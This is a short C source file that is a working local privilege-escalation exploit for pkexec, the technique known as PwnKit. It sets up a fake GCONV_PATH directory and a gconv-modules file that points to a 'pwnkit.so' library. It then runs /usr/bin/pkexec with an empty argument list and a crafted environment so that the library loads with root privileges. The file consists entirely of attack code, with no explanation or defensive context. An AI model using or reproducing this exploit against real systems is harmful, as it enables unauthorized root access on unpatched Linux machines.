#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define BIN "/usr/bin/pkexec"
#define DIR "pwnkit"
#define PWNKITSO "pwnkit"

int main()
{
    char *envp[] = {
        DIR,
        "PATH=GCONV_PATH=.",
        "SHELL=pwnkit",
        "CHARSET=pwnkit",
        NULL
    };
    char *argv[] = { NULL };

    system("mkdir GCONV_PATH=.");
    system("touch GCONV_PATH=./" DIR " && chmod +x GCONV_PATH=./" DIR);
    system("mkdir " DIR);
    system("echo 'module\tINTERNAL\t\t\tpwnkit//\t\t\t" PWNKITSO "\t\t\t2' > " DIR "/gconv-modules");
    system("cp " PWNKITSO ".so " DIR);

    execve(BIN, argv, envp);

    return 0;
}
